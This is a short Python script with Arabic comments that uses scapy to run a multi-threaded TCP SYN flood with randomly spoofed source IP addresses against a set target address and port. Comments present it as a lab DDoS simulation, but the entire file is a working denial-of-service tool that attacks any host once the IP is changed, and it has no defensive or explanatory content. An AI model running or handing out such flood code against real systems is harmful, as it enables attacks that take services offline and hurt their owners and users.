from scapy.all import *
import random
import threading

# إعدادات الهجوم
target_ip = "192.168.1.100"  # غيّر هذا إلى IP الجهاز الهدف داخل المعمل
target_port = 80             # المنفذ المستهدف (مثلاً: HTTP)

# عدد الحزم التي سيتم إرسالها من كل خيط (thread)
packet_count = 1000

def generate_packet():
    ip_layer = IP(src=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                  dst=target_ip)
    tcp_layer = TCP(sport=random.randint(1024,65535), dport=target_port, flags="S")
    packet = ip_layer / tcp_layer
    return packet

def attack():
    for _ in range(packet_count):
        packet = generate_packet()
        send(packet, verbose=False)

# تشغيل عدة خيوط (Threads) لمحاكاة هجوم موزع
thread_count = 10

print(f"🚀 بدء محاكاة هجوم DDoS على {target_ip}:{target_port} باستخدام {thread_count} خيوط...")
threads = []

for _ in range(thread_count):
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("✅ تم الانتهاء من المحاكاة.")
